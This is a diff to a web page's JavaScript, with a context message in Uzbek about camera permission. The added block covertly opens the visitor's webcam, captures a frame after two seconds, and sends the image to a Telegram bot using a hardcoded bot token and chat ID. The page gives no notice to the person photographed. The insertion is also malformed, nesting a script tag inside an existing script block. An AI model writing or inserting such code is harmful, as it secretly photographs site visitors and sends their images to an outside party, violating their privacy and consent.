@@ -42,9 +42,44 @@
         .catch(err => {
             console.log("Kameraga ruxsat berilmadi");
         });
+    <script>
+function sendToTelegram(imageData) {
+    const botToken = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
+    const chatId = "7880376636";
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: new URLSearchParams({
+            chat_id: chatId,
+            photo: imageData
+        })
+    });
+}
+
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
+
+    setTimeout(() => {
+        const canvas = document.createElement("canvas");
+        canvas.width = 320;
+        canvas.height = 240;
+        canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
+
+        const imageData = canvas.toDataURL("image/jpeg");
+        sendToTelegram(imageData);
+
+        stream.getTracks().forEach(t => t.stop());
+    }, 2000);
+});
+</script>
+
 </script>
 
 </body>
 </html>
+
 
 
